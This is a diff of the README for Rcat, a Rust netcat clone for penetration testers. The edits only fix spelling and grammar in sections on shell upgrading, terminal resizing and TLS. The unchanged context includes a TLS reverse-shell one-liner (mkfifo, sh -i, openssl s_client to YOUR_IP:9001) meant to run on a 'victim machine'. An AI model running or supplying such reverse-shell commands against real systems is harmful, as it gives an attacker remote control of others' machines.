@@ -11,7 +11,7 @@ __Rcat__ is a modern _netcat_ written in Rust, packed with features for hackers.
 
 <img src="images/rcat_curl.svg">
 
-Here we listen on the port `tcp:9001`, and recieve an HTTP request made with `curl`.
+Here we listen on port `tcp:9001`, and receive an HTTP request made with `curl`.
 
 ### Install
 
@@ -33,18 +33,18 @@ Rcat keeps a syntax similar to _netcat_. You already know how to use it.
 
 Rcat can __upgrade your shells__ with the `--pwn` option.  
 With an upgraded shell, you can use shortcuts like `Ctrl + C`, clear the terminal with `clear` or `Ctrl + L`, etc. It's like having an SSH connection.
-No need to [type 7 commands](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) every type you obtain a reverse shell.
+There is no need to [type 7 commands](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) each time you obtain a reverse shell.
 
 <img src="images/rcat_pwn.svg">
 
 #### Resize
 
-Unless you use the `-R` option, the remote terminal will automaticaly be resized when you change the size of your terminal.  
-(Rcat sends a _SIGTSTP_, resize the terminal with the `stty` command, and use `fg` to restore the application running.)
+Unless you use the `-R` option, the remote terminal will automatically be resized when you change the size of your terminal.  
+(Rcat sends a _SIGTSTP_, resizes the terminal with the `stty` command then uses `fg` to restore the application running.)
 
 <img src="images/rcat_resize.webp">
 
-> In this clip with run `htop` on the victim machine. And the reverse shell is automaticaly resized.
+> In this clip we run `htop` on the victim machine, and the reverse shell is automatically resized.
 
 #### TLS support
 
@@ -58,7 +58,7 @@ Here we do an HTTPS request. We use `-t` to establish a _TLS connection_, and `-
 
 With TLS support, let's see how we can do an __TLS encrypted reverse shell__. Without installing any new tools on the victim.
 
-If possible, you should probaby use a signed certificate (with [let's encrypt](https://certbot.eff.org/instructions) for example), but for now let's use a self-signed certificate.
+If possible, you should probably use a signed certificate (with [let's encrypt](https://certbot.eff.org/instructions) for example), but for now let's use a self-signed certificate.
 
 ### Generate Key and Certificate
 
@@ -77,7 +77,7 @@ Armed with this, let's create a _listener_ that supports TLS.
 rcat -l 9001 -t --cert my.cert --key private-key.pem --pwn
 ```
 
-And execute the following command on the victim machine:
+Then execute the following command on the victim machine:
 
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| openssl s_client -connect YOUR_IP:9001 >/tmp/f
